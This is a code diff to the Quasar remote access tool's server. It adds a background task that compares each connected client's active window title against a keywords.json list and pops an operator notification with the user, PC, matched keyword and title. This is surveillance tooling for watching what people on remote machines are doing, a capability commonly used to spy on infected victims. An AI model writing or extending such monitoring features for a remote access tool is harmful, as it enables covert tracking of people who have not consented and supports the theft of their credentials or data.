@@ -2,8 +2,14 @@
 using Quasar.Common.Messages;
 using Quasar.Common.Messages.other;
 using Quasar.Common.Networking;
+using Quasar.Server.Forms;
 using Quasar.Server.Networking;
 using System;
+using System.IO;
+using System.Linq;
+using System.Text.Json;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Quasar.Server.Messages
 {
@@ -130,6 +136,36 @@ namespace Quasar.Server.Messages
         private void Execute(Client client, SetUserActiveWindowStatus message)
         {
             OnUserActiveWindowStatusUpdated(client, message.WindowTitle);
+
+            // checks if the title contains a key word
+
+            Task.Run(() =>
+            {
+                string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");
+
+                if (File.Exists(keywordsFilePath))
+                {
+                    string jsonContent = File.ReadAllText(keywordsFilePath);
+                    var keywords = JsonSerializer.Deserialize<string[]>(jsonContent);
+
+                    if (keywords != null)
+                    {
+                        var matchedKeyword = keywords.FirstOrDefault(keyword => message.WindowTitle.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);
+
+                        if (matchedKeyword != null)
+                        {
+                            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
+                            if (frm != null)
+                            {
+                                frm.Invoke(new Action(() =>
+                                {
+                                    FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Keyword triggered: " + matchedKeyword, message.WindowTitle);
+                                }));
+                            }
+                        }
+                    }
+                }
+            });
         }
     }
 }
